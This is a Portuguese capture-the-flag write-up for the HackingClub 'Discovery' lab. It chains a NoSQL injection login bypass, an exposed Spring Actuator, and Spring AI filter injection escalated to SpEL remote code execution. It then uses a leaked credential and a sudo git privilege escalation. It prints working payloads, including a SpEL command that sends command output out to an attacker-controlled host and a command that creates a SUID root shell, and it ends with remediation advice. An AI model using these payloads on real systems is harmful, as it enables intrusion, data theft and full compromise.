# Discovery - HackingClub

**Alvo:** 172.16.14.150  (`discovery.hc`, `api.discovery.hc`)
**Resultado:** Comprometimento total — RCE (container, root) → host (user `marina`) → root.
**Flags:** user `hackingclub{user_flag}` · root `hackingclub{root_flag}`

---

## 1. Resumo

A intrusão encadeou **5 vulnerabilidades** distintas, partindo de uma aplicação web sem
qualquer credencial até execução de comandos como root no host:

1. **NoSQL Injection (auth bypass)** no front-end Node/Express (`discovery.hc`).
2. **Exposição do Spring Boot Actuator** no back-end Java (`api.discovery.hc`).
3. **Spring AI Filter Expression Injection → SpEL Injection → RCE** (CVSS ~8.6) no `docservice-app`.
4. **Vazamento de credenciais privilegiadas do MongoDB** via leitura de `/app/.env.internal` com a RCE.
5. **Reuso de credencial + PrivEsc por `sudo git`** (GTFOBins) → root no host.

A metodologia foi sempre a mesma: **para cada suspeita, formular uma hipótese e desenhar
um teste capaz de REFUTAR ou CONFIRMAR de forma binária** (oráculo), antes de avançar.

---

## 2. Reconhecimento

### 2.1 Portas (scan TCP completo 1-65535, Python sockets via tun0)

```bash
22/tcp   OpenSSH 9.6p1 Ubuntu
80/tcp   nginx 1.24.0 (Ubuntu)
27017/tcp MongoDB 6.0.27   (buildInfo/ping/hello respondem sem auth; dados exigem auth)
```

### 2.2 Virtual hosts (Host header)

- `discovery.hc` → app Express (`X-Powered-By: Express`) → 302 /login.
- `api.discovery.hc` → **server-block próprio** (404 do nginx, ≠ catch-all 301→discovery.hc).
- Demais nomes → catch-all 301.
- **Resolução `.hc` é manual (`/etc/hosts`)** — não há DNS interno; `discovery.hc`/`api.discovery.hc` apontam para .150.

### 2.3 Fingerprint do app (discovery.hc)

- e-Discovery "Discovery Portal", Express + EJS (reflexão HTML-escapada), `connect.sid` (express-session, store server-side, ID 24 bytes aleatórios).
- Rotas reais: `/login`, `POST /auth/login`, `/search`, `/search/query`, `/logout`, `/css`, `/js`.

---

## 3. Vulnerabilidade 1 — NoSQL Injection (auth bypass)

**Hipótese:** o login pode ser injetável (SQLi ou NoSQLi).

**Teste de refutação SQLi (form-urlencoded):**

```bash
email=' OR '1'='1   &  password=...   → 200 (mesma página de login)  ❌ refuta SQLi
```

**Teste de confirmação NoSQLi (JSON com operadores Mongo):**

```bash
POST /auth/login  {"email":{"$ne":null},"password":{"$ne":null}}
→ 302 Found, Location: /search, Set-Cookie: connect.sid=...   ✅ CONFIRMA NoSQLi
```

- `$gt`/`$ne` também funcionam; `$regex` permite extração cega (boolean oracle).
- **Refutado** que o login use `findOne(req.body)`: campos extras (`role`, `__proto__`, etc.)
  são **ignorados** (`{...,"zzznotreal":{"$exists":true}}` → ainda 302), enquanto
  `{"password":"garbage"}` → 200. Logo a query é `findOne({email, password})`, ambos injetáveis.
- Extração cega (`$regex` ancorado + binary search) revelou 3 usuários
  (`anne.carroll`, `brian.thompson`, `claire.stevenson` @discovery.hc, senha `<REDACTED>`).

---

## 4. Becos sem saída — testes que REFUTARAM hipóteses (registrados para rigor)

Antes de achar o caminho real, várias hipóteses foram **descartadas com teste explícito**:

| Hipótese | Teste | Resultado |
| --- | --- | --- |
| Operator injection na busca (Mongo) | `filterValue[$ne]=finance`, `filterValue={"$ne":..}` | "No documents" → **valor coagido a string** ❌ |
| SSTI no front Node | `q/filterKey/filterValue = {{7*7}}`, `<%=7*7%>`, `#{7*7}` | tudo HTML-escapado, sem eval ❌ |
| Prototype Pollution (Node) | poluir `__proto__`/`constructor.prototype` (body e query) e checar tag `for-in`, props `isAdmin`, gadget EJS `outputFunctionName`, atributos do `Set-Cookie` | nenhum efeito ❌ |
| Forjar sessão | crack do HMAC-SHA256 do `connect.sid` (rockyou + lista temática) | secret não quebra ❌ |
| Mongo (default/reuso) | 690 combos + creds da app | auth obrigatória ❌ (até a fase 6) |
| `api.discovery.hc` = decoy | ffuf com `common.txt`/`directory-list` | **ERRO METODOLÓGICO**: wordlists sem `actuator` → conclusão falsa (corrigida na fase 5) |

**Lição:** a falsa conclusão "decoy" veio de wordlist inadequada. `quickhits.txt` (Spring-aware) revelou `/actuator`.

---

## 5. Vulnerabilidade 2 — Spring Boot Actuator exposto (`api.discovery.hc`)

**Confirmação:**

```bash
GET /actuator        → 200 (_links: health, env)
GET /actuator/env    → 200  (management.endpoint.env.show-values=always)
GET /actuator/health → 200  (path:/app/.)
```

**App:** `docservice-app`, Spring Boot 3 / Java 17 (Temurin), Tomcat embarcado, container Docker
`0d9ad0313ac9` rodando como **root**, `spring.ai.version=1.0.0-M6`, `vector-store=SimpleVectorStore`.

**Mapeamento do proxy nginx (teste Spring-404 vs nginx-404):**

- Só `/actuator/*` é proxiado pro Spring; demais paths → 404 do nginx.
- Teste de traversal `..;/` (Tomcat path-param): `/actuator/..;/actuator/env` →
  404 do **Spring** com `path:"/actuator/..;/actuator/env"` (literal) → **Spring 6 NÃO normaliza** → traversal refutado.
- `POST /actuator/env` → 405 (write desabilitado; sem Spring Cloud → sem refresh/restart). Sem RCE direto pelo actuator.

---

## 6. Vulnerabilidade 3 — Spring AI Filter Injection → SpEL → RCE (núcleo)

O front `discovery.hc` repassa `filterKey`/`filterValue` ao back Spring montando uma
expressão de filtro: `<filterKey> == '<filterValue>'`.

**Passo A — confirmar injeção na expressão de filtro (oráculo por contagem):**

```bash
filterKey=department&filterValue=finance              → 2 docs   (baseline)
filterKey=department&filterValue=finance' || 'a'=='a  → 8 docs (TODOS)  ✅ injeção confirmada
```

**Passo B — refutar/confirmar SpEL (time-based, prova binária):**

```bash
baseline                                                         → 0,28 s
filterValue=x' or T(java.lang.Thread).sleep(5000)=='             → 10,3 s
filterValue=finance' || T(java.lang.Thread).sleep(5000) || 'a'=='a → 5,3 s   ✅ SpEL é AVALIADO = RCE
```

> A `filterValue` é interpolada e avaliada como **Spring Expression Language**. Isso transforma a
> filter-expression injection (CVE Spring AI, CVSS 8.6) em **execução de código Java arbitrário**.

**Passo C — confirmar egress + execução com saída (Java puro, sem depender de binários):**

```bash
filterValue=x' + new java.net.URL('http://10.0.9.55:8001/javacb').getContent() + 'x
→ listener recebe "GET /javacb"   ✅ egress + exec confirmados
```

**Passo D — exec de comando com exfiltração OOB (Base64 url-safe):**

```bash
filterValue=x' + new java.net.URL('http://LHOST:8001/d/' +
  T(java.util.Base64).getUrlEncoder().encodeToString(
    new java.util.Scanner(
      T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","CMD"}).getInputStream()
    ).useDelimiter("\\A").next().getBytes()
  )).getContent() + 'x
```

`id` → `uid=0(root)` no container. (`PoC: /search/query?q=document&filterKey=department&filterValue=<payload>`)

---

## 7. Vulnerabilidade 4 — Vazamento de credenciais (pós-RCE)

Com a RCE, `cat /app/.env.internal`:

```bash
MONGO_HOST=mongodb  MONGO_PORT=27017  MONGO_DB=discoveryportal
MONGO_PRIV_USER=marina  MONGO_PRIV_PASS=<REDACTED>
```

**Confirmação no Mongo exposto (:27017):**

```bash
mongo marina:<REDACTED>  authSource=discoveryportal  → AUTENTICADO
db.vault → {_id:'ssh_credentials', username:'marina',
            password:'$2b$<REDACTED>TZBo.',
            note:'Host access credentials'}
```

---

## 8. Vulnerabilidade 5 — Crack + PrivEsc no host

**Crack do bcrypt (john + rockyou):** `marina : <REDACTED>`.
**Escape do container (SSH):**

```bash
ssh marina@172.16.14.150  (senha <REDACTED>)  → uid=1001(marina) no HOST ip-172-16-14-150
~/user.txt → hackingclub{user_flag}
```

**PrivEsc — `sudo -l`:** `(root) NOPASSWD: /usr/bin/git` → GTFOBins (pager roda via shell como root):

```bash
sudo git -c core.pager='cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' -p help
/tmp/rootbash -p          → euid=0(root)
cat /root/r0Ot.txt → hackingclub{root_flag}
```

---

## 9. Diagrama da killchain

```bash
[sem cred]
  │ NoSQLi auth bypass (discovery.hc / Express+Mongo)
  ▼
[sessão válida] ──> recon: api.discovery.hc (Spring) ──> Actuator /env (info)
  │ Spring AI Filter Injection -> SpEL
  ▼
[RCE root @ container docservice-app]
  │ leak /app/.env.internal
  ▼
[creds Mongo: marina] ──> dump discoveryportal.vault (bcrypt ssh)
  │ crack -> <REDACTED>
  ▼
[SSH marina @ host]  -> USER FLAG
  │ sudo git (GTFOBins)
  ▼
[root @ host]        -> ROOT FLAG
```

## 10. Remediação

1. **NoSQLi:** validar tipo de `email`/`password` (rejeitar objetos); usar parametrização/cast string.
2. **Filter/SpEL injection:** NUNCA interpolar input do usuário em filter-expression/SpEL; usar a API
   programática de `Filter.Expression`/parser parametrizado do Spring AI; atualizar Spring AI.
3. **Actuator:** restringir `management.endpoints.web.exposure.include`; nunca expor `env` com
   `show-values=always`; isolar porta de management; `env`/secrets fora do classpath.
4. **Segredos:** não versionar `.env.internal` no container; usar secret manager; rotacionar
   `marina`/Mongo após vazamento.
5. **MongoDB:** não expor 27017 na rede; least-privilege para a conta da aplicação.
6. **PrivEsc:** remover `sudo NOPASSWD git` (GTFOBins); aplicar least-privilege no sudoers.
7. **Container:** não rodar como root; rede do container sem egress arbitrário.
